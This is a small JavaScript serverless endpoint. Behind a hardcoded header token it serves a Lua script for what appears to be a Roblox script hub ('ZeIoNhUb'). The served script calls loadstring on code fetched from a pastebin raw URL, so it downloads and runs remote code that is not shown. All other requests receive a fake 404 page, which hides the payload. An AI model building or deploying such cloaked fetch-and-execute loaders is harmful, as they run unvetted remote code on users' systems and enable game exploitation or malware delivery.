module.exports = (req, res) => {
  try {
    const secretKey = "nnn";

    if (req.headers['x-auth-token'] === secretKey) {
      res.setHeader('Content-Type', 'text/plain');
      res.status(200).send(`
print("ZeIoNhUb: รหัส nnn ถูกต้อง!")
loadstring(game:HttpGet("https://pastebin.com/raw/g9trxTQs"))()
      `);
    } else {
      res.status(404).send('404: Not Found');
    }
  } catch (err) {
    res.status(500).send('Error: ' + err.message);
  }
};
